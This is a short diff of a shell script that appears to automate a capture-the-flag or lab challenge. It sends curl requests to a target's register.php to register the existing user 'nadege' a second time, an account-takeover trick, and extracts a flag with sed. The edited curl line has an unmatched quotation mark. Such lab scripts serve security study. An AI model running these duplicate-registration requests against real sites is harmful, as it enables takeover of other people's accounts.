@@ -37,4 +37,5 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering nadege a second time
 echo "4 - REGISTERING ARTHUR"
-curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user= nadege" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" -v
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L \
+     -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary=@7-data/nadege.txt"
